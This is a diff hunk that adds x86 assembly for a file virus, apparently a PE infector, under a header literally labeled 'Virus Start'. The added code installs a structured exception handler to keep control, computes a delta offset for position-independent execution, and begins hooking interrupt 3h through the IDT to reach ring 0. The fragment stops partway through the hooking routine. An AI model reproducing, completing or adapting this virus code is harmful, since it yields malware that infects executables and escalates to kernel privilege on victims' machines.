@@ -48,3 +48,44 @@ Header:
 .NumberOfSymbols dd
 .SizeOfOptionalHeader dw
 .Characteristics dw
+
+;********************************************
+;* Constants *
+;********************************************
+HookExceptionNumber equ 3h
+
+;********************************************
+;* Virus Start *
+;********************************************
+virus_start:
+push ebp
+;******************************************
+;* First order of buisness is *
+;* to modify SEH So that if an exceptions *
+;* occur we still have control *
+;******************************************
+lea eax, [esp-4h*2]
+
+xor ebx, ebx
+xchg eax, [fs:ebx]
+
+call .get_delta
+.get_delta:
+pop ebx
+
+lea ecx, [ebx+(ExceptionOccured-.get_delta)]
+
+push ecx
+push eax
+
+;***************************
+;* Now we need to actually *
+;* Hook Int 3h *
+;* To actually get Ring 0 *
+;***************************
+
+push eax
+sidt [esp-02h]
+pop ebx
+
+add ebx, HookExceptionNumber*08h+04h
